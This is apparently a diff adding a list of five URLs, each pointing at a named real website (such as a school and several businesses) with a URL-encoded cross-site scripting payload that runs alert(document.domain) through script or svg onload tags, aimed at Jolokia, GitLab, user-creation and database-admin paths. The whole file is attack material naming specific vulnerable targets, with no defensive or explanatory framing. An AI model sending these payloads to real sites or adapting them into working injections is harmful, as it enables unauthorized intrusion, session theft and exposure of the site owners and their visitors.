@@ -1,0 +1,5 @@
+http://globaltherm.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://gofair.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://gw.padrogus.de/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+https://gymnasium-ettenheim.de/?db=mysql&server=db&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&username=root
+https://gynaekomastie-frankfurt.os.webhelps-service.de/?s=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
